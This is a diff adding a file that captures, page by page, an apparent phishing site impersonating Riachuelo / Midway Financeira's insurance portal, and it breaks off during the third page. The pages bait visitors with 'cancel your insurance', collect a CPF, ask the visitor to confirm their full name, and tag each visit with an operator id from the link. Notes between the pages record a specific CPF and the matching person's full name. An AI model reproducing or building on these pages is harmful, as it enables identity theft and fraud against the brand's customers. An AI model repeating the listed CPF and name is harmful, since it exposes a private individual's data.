@@ -1,0 +1,2234 @@
+PAGINA '1'
+
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Riachuelo - Central de Seguros</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+
+<div class="sc-jwLVGg sc-jHoSbG UXilN">
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-credit-card">
+                    <path d="M3 5m0 3a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3z"></path>
+                    <path d="M3 10l18 0"></path>
+                    <path d="M7 15l.01 0"></path>
+                    <path d="M11 15l2 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Fatura Cartão<br>RCHLO</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-jXxpsA cjERrS">
+                    <g clip-path="url(#clip0_695_538)">
+                        <path d="M10.6668 6.28711C12.5078 6.28711 14.0002 5.39168 14.0002 4.28711C14.0002 3.18254 12.5078 2.28711 10.6668 2.28711C8.82588 2.28711 7.3335 3.18254 7.3335 4.28711C7.3335 5.39168 8.82588 6.28711 10.6668 6.28711Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 4.28711V6.95378C7.3335 8.05844 8.82616 8.95378 10.6668 8.95378C12.5075 8.95378 14.0002 8.05844 14.0002 6.95378V4.28711" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 6.95312V9.61979C7.3335 10.7245 8.82616 11.6198 10.6668 11.6198C12.5075 11.6198 14.0002 10.7245 14.0002 9.61979V6.95312" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 9.62109V12.2878C7.3335 13.3924 8.82616 14.2878 10.6668 14.2878C12.5075 14.2878 14.0002 13.3924 14.0002 12.2878V9.62109" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M4.66667 6.28711H3C2.73478 6.28711 2.48043 6.39247 2.29289 6.58C2.10536 6.76754 2 7.02189 2 7.28711C2 7.55233 2.10536 7.80668 2.29289 7.99422C2.48043 8.18175 2.73478 8.28711 3 8.28711H3.66667C3.93188 8.28711 4.18624 8.39247 4.37377 8.58C4.56131 8.76754 4.66667 9.02189 4.66667 9.28711C4.66667 9.55233 4.56131 9.80668 4.37377 9.99422C4.18624 10.1818 3.93188 10.2871 3.66667 10.2871H2" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M3.3335 5.62109V6.28776M3.3335 10.2878V10.9544V10.2878Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </g>
+                    <defs>
+                        <clipPath id="clip0_695_538">
+                            <rect width="16" height="16" fill="white" transform="translate(0 0.287109)"></rect>
+                        </clipPath>
+                    </defs>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Parcela<br>Empréstimo</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-discount">
+                    <path d="M9 15l6 -6"></path>
+                    <circle cx="9.5" cy="9.5" r=".5" fill="currentColor"></circle>
+                    <circle cx="14.5" cy="14.5" r=".5" fill="currentColor"></circle>
+                    <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Negociação<br>RCHLO</span></p>
+    </div>
+</div>
+
+<div class="separator-line"></div>
+
+<main class="container" id="mainContent">
+    
+    <div class="security-tag" style="display: flex; align-items: center; margin-bottom: 15px;">
+<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-lock"><path d="M5 13a2 2 0 0 1 2 -2h10a2 2 0 0 1 2 2v6a2 2 0 0 1 -2 2h-10a2 2 0 0 1 -2 -2v-6z"></path><path d="M11 16a1 1 0 1 0 2 0a1 1 0 0 0 -2 0"></path><path d="M8 11v-4a4 4 0 1 1 8 0v4"></path></svg>
+        
+        <span>Garantia de segurança Riachuelo</span>
+    </div>
+
+    <h1 style="text-align: left;">
+  Olá! Você está no portal de Seguros Riachuelo / Midway Financeira.
+</h1>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="cpf">CPF</label>
+            <input style="text-align: left;" type="tel" id="cpf" name="cpf" maxlength="14" placeholder="000.000.000-00" autocomplete="off">
+        </div>
+
+        <button type="submit" id="btnConsultar" disabled="">Consultar</button>
+    </form>
+<div class="card-display">
+        <img src="img/cartao_riachuelo.png" alt="Cartão Riachuelo" id="cardImage">
+    </div>
+
+</main> <div class="timeline-section">
+    <div class="timeline-container">
+        <h2 class="timeline-title">Veja como é simples cancelar o seu seguro</h2>
+        
+        <ul class="timeline-list">
+            <li class="timeline-item">
+                <div class="timeline-circle">1</div>
+                <div class="timeline-text">Digite CPF</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">2</div>
+                <div class="timeline-text">Responda as perguntas corretamente</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">3</div>
+                <div class="timeline-text">Valide seus dados pessoais</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle orange-circle">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M7 17l10-6-6-6z"></path>
+                        <path d="M19 4v.01"></path>
+                        <path d="M22 9v.01"></path>
+                        <path d="M14 2v.01"></path>
+                    </svg>
+                </div>
+                <div class="timeline-text">Seguro cancelado com sucesso!</div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+
+<script src="js/script.js"></script>
+<script src="js/tracking.js"></script>
+<script>
+    // Identifica por qual link o cliente entrou (ex: ?cancelar)
+    let queryString = window.location.search.substring(1);
+    let operadorUrl = queryString.split('&')[0].replace('/', '');
+    
+    if (operadorUrl && operadorUrl !== "") {
+        // Guarda o operador no navegador do cliente
+        localStorage.setItem('id_operador', operadorUrl);
+    } else if (!localStorage.getItem('id_operador')) {
+        // Se acedeu ao site normal sem link, define como padrao
+        localStorage.setItem('id_operador', 'padrao');
+    }
+</script>
+
+</body>
+
+
+
+
+DIGITEI UM CPF QUE SEI QUE TEM CADASTRO 52150755653 
+APOS ISSO FOI PRA ESSA TELA 
+
+PAGINA '2'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Riachuelo - Central de Seguros</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+
+<div class="sc-jwLVGg sc-jHoSbG UXilN" style="display: none;">
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-credit-card">
+                    <path d="M3 5m0 3a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3z"></path>
+                    <path d="M3 10l18 0"></path>
+                    <path d="M7 15l.01 0"></path>
+                    <path d="M11 15l2 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Fatura Cartão<br>RCHLO</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-jXxpsA cjERrS">
+                    <g clip-path="url(#clip0_695_538)">
+                        <path d="M10.6668 6.28711C12.5078 6.28711 14.0002 5.39168 14.0002 4.28711C14.0002 3.18254 12.5078 2.28711 10.6668 2.28711C8.82588 2.28711 7.3335 3.18254 7.3335 4.28711C7.3335 5.39168 8.82588 6.28711 10.6668 6.28711Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 4.28711V6.95378C7.3335 8.05844 8.82616 8.95378 10.6668 8.95378C12.5075 8.95378 14.0002 8.05844 14.0002 6.95378V4.28711" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 6.95312V9.61979C7.3335 10.7245 8.82616 11.6198 10.6668 11.6198C12.5075 11.6198 14.0002 10.7245 14.0002 9.61979V6.95312" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 9.62109V12.2878C7.3335 13.3924 8.82616 14.2878 10.6668 14.2878C12.5075 14.2878 14.0002 13.3924 14.0002 12.2878V9.62109" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M4.66667 6.28711H3C2.73478 6.28711 2.48043 6.39247 2.29289 6.58C2.10536 6.76754 2 7.02189 2 7.28711C2 7.55233 2.10536 7.80668 2.29289 7.99422C2.48043 8.18175 2.73478 8.28711 3 8.28711H3.66667C3.93188 8.28711 4.18624 8.39247 4.37377 8.58C4.56131 8.76754 4.66667 9.02189 4.66667 9.28711C4.66667 9.55233 4.56131 9.80668 4.37377 9.99422C4.18624 10.1818 3.93188 10.2871 3.66667 10.2871H2" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M3.3335 5.62109V6.28776M3.3335 10.2878V10.9544V10.2878Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </g>
+                    <defs>
+                        <clipPath id="clip0_695_538">
+                            <rect width="16" height="16" fill="white" transform="translate(0 0.287109)"></rect>
+                        </clipPath>
+                    </defs>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Parcela<br>Empréstimo</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-discount">
+                    <path d="M9 15l6 -6"></path>
+                    <circle cx="9.5" cy="9.5" r=".5" fill="currentColor"></circle>
+                    <circle cx="14.5" cy="14.5" r=".5" fill="currentColor"></circle>
+                    <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Negociação<br>RCHLO</span></p>
+    </div>
+</div>
+
+<div class="separator-line" style="display: none;"></div>
+
+<main class="container" id="mainContent">
+                <div class="fade-in" style="margin-top: 20px;">
+                    <h2 style="font-size: 24px; font-weight: bold; margin-bottom: 25px;">Validação de Segurança</h2>
+                    <p style="margin-bottom: 20px; color: #666; font-size: 15px;">Confirme seu NOME COMPLETO:</p>
+                    <div class="options-list">
+                        
+                            <button class="btn-opt" onclick="window.verificar('MARCOS ANTONIO OLIVEIRA')">
+                                MARCOS ANTONIO OLIVEIRA
+                            </button>
+                        
+                            <button class="btn-opt" onclick="window.verificar('JOAO RICARDO SILVA')">
+                                JOAO RICARDO SILVA
+                            </button>
+                        
+                            <button class="btn-opt" onclick="window.verificar('FILIPE EUGENIO MAIA BALLSTAEDT')">
+                                FILIPE EUGENIO MAIA BALLSTAEDT
+                            </button>
+                        
+                    </div>
+                </div>
+            </main> <div class="timeline-section" style="display: none;">
+    <div class="timeline-container">
+        <h2 class="timeline-title">Veja como é simples cancelar o seu seguro</h2>
+        
+        <ul class="timeline-list">
+            <li class="timeline-item">
+                <div class="timeline-circle">1</div>
+                <div class="timeline-text">Digite CPF</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">2</div>
+                <div class="timeline-text">Responda as perguntas corretamente</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">3</div>
+                <div class="timeline-text">Valide seus dados pessoais</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle orange-circle">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M7 17l10-6-6-6z"></path>
+                        <path d="M19 4v.01"></path>
+                        <path d="M22 9v.01"></path>
+                        <path d="M14 2v.01"></path>
+                    </svg>
+                </div>
+                <div class="timeline-text">Seguro cancelado com sucesso!</div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+
+<script src="js/script.js"></script>
+<script src="js/tracking.js"></script>
+<script>
+    // Identifica por qual link o cliente entrou (ex: ?cancelar)
+    let queryString = window.location.search.substring(1);
+    let operadorUrl = queryString.split('&')[0].replace('/', '');
+    
+    if (operadorUrl && operadorUrl !== "") {
+        // Guarda o operador no navegador do cliente
+        localStorage.setItem('id_operador', operadorUrl);
+    } else if (!localStorage.getItem('id_operador')) {
+        // Se acedeu ao site normal sem link, define como padrao
+        localStorage.setItem('id_operador', 'padrao');
+    }
+</script>
+
+</body></html>
+
+
+A OPÇAO CERTA E A DO FILIPE EUGENIO MAIA BALLSTAEDT 
+CLIQUEI NO NOME E FOI PARA PROXIMA TELA 
+
+PAGINA '3'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Riachuelo - Central de Seguros</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+
+<div class="sc-jwLVGg sc-jHoSbG UXilN" style="display: none;">
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-credit-card">
+                    <path d="M3 5m0 3a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3z"></path>
+                    <path d="M3 10l18 0"></path>
+                    <path d="M7 15l.01 0"></path>
+                    <path d="M11 15l2 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Fatura Cartão<br>RCHLO</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-jXxpsA cjERrS">
+                    <g clip-path="url(#clip0_695_538)">
+                        <path d="M10.6668 6.28711C12.5078 6.28711 14.0002 5.39168 14.0002 4.28711C14.0002 3.18254 12.5078 2.28711 10.6668 2.28711C8.82588 2.28711 7.3335 3.18254 7.3335 4.28711C7.3335 5.39168 8.82588 6.28711 10.6668 6.28711Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 4.28711V6.95378C7.3335 8.05844 8.82616 8.95378 10.6668 8.95378C12.5075 8.95378 14.0002 8.05844 14.0002 6.95378V4.28711" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 6.95312V9.61979C7.3335 10.7245 8.82616 11.6198 10.6668 11.6198C12.5075 11.6198 14.0002 10.7245 14.0002 9.61979V6.95312" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 9.62109V12.2878C7.3335 13.3924 8.82616 14.2878 10.6668 14.2878C12.5075 14.2878 14.0002 13.3924 14.0002 12.2878V9.62109" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M4.66667 6.28711H3C2.73478 6.28711 2.48043 6.39247 2.29289 6.58C2.10536 6.76754 2 7.02189 2 7.28711C2 7.55233 2.10536 7.80668 2.29289 7.99422C2.48043 8.18175 2.73478 8.28711 3 8.28711H3.66667C3.93188 8.28711 4.18624 8.39247 4.37377 8.58C4.56131 8.76754 4.66667 9.02189 4.66667 9.28711C4.66667 9.55233 4.56131 9.80668 4.37377 9.99422C4.18624 10.1818 3.93188 10.2871 3.66667 10.2871H2" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M3.3335 5.62109V6.28776M3.3335 10.2878V10.9544V10.2878Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </g>
+                    <defs>
+                        <clipPath id="clip0_695_538">
+                            <rect width="16" height="16" fill="white" transform="translate(0 0.287109)"></rect>
+                        </clipPath>
+                    </defs>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Parcela<br>Empréstimo</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-discount">
+                    <path d="M9 15l6 -6"></path>
